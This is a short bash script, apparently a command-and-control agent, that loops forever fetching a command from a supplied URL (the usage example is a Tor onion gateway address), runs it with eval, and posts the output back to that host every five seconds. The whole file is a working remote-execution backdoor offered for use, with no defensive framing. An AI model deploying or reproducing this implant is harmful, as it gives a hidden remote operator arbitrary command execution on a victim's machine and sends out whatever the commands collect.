#!/usr/bin/env bash
# Usage: ./agent.sh http://ONION.EXT
# E.G ./agent.sh http://mipzy2bandglnot3tatof5jtjwva3elrinmfegdyfhx2ftkuj3zrnhad.onion.pet

while :
do
    # Repeatedly get the command, execute it, and post the output
    cmd="$(curl -s $1)"
    output="$(eval $cmd)"
    curl -d "${output}" -X POST $1
    sleep 5
done